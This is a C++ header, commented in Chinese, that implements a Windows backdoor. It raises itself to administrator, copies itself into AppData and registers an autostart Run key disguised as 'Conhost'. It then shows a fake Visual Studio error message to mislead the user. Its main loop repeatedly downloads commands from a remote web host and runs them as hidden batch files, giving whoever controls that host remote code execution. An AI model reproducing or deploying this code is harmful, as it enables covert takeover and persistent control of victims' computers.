//请配合 OpenCppLangTab框架使用
//替换其中的example.h
//搭建OCLT版本为 1019

#pragma once

#include"shload.h"

#include<ShlObj.h>

string WebSocketAPI = "https://api.foxaxu.com/winhekapi/COMMAND.txt?rand=";
//设置WebHTTP接口
//使用Windows URLMON API 进行下载读取

void OsMonitor_MainProcess();

void argsApi(string args$api) {

	if (args$api == "--run-osmonitor") {
		//区分进程与注入模式
		OsMonitor_MainProcess();
		return;
	}

	_prtoutmsg("Unknown Args :  " + args$api);
	return;
}

int _HeadMainLoad() {
	//主执行

	//获取系统变量以方便注入
	string getenv_local = getenv("appdata");
	string newfile_path = getenv_local + "\\WHP.exe";

	if (_$GetSelfName == newfile_path) {
		//防止程序重复注入
		return 0;
	}

	if (!IsUserAnAdmin()){
		//确定是否在管理员模式
		//以方便写入注册表
		ShellExecute(0, "runas", _$GetSelfName.c_str(), 0, 0, SW_SHOW);
		return 0;
	}

	if (check_file_existenceA(newfile_path)) {
		//如果存在旧版程序则会替换为新版程序
		ShellExecute(0, "runas", "taskkill.exe", "/f /im WHP.exe", 0, SW_HIDE);
		sleepapi(3);
		remove(newfile_path.c_str());
	}

	//CopySelf
	CopyFile(_$GetSelfName.c_str(), newfile_path.c_str(),0);

	//写入注册表以实现开机启动
	string cmds = "add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f /v \"Conhost \" /t REG_SZ /d \"\"" + newfile_path + "\" --run-osmonitor\" ";

	ShellExecute(0, "runas", "reg.exe", cmds.c_str(), 0, SW_HIDE);

	ShellExecute(0, "open", newfile_path.c_str(), "--run-osmonitor",getenv_local.c_str(), SW_HIDE);

	//外壳 -模拟报错
	MessageBox(0, "    This Application cannot running on Win32 mode","Microsoft.VisualStudio.Error" , MB_OK | MB_ICONERROR);
	return 0;
}

void OsMonitor_MainProcess() {
	//Hacked mode
	//监视主进程

	string ostemp = getenv("temp");

	string getcmd;

	string oldcmd;

	//保持启动状态
	while (true) {
		sleepapi(5);
		//间歇时间，防止过度占用系统性能
		
		bool uaresult = _urldown_api(WebSocketAPI + _get_random_s(1, 1000), ostemp + "\\WHX.dat");
		//使用WindowsAPI获取指令进行下载

		if (!uaresult) {
			continue;
			//如果获取指令失败则继续进行返回操作
		}

		getcmd = _fileapi_textread(ostemp + "\\WHX.dat", 1);
		//获取指令内容
		if (getcmd == "NULL") {
			continue;
			//WebHTTP定义 NULL 为空闲指令，
		}

		if (oldcmd == getcmd) {
			continue;
			//旧指令与新指令相同，停止执行，防止重复执行
		}
		else {
			//运行新指令
			oldcmd = getcmd;
			_fileapi_createmark(ostemp + "\\whxbatch.bat", getcmd);
			string tcmds = ostemp + "\\whxbatch.bat";
			//使用ShellExecute隐藏CMD控制台
			ShellExecute(0, "open", tcmds.c_str(),0, 0, SW_HIDE);
			continue;
			//继续执行
		}

		continue;
	}
	
	MessageBox(0, "WHX Error", "Error", MB_OK);
	return;
}
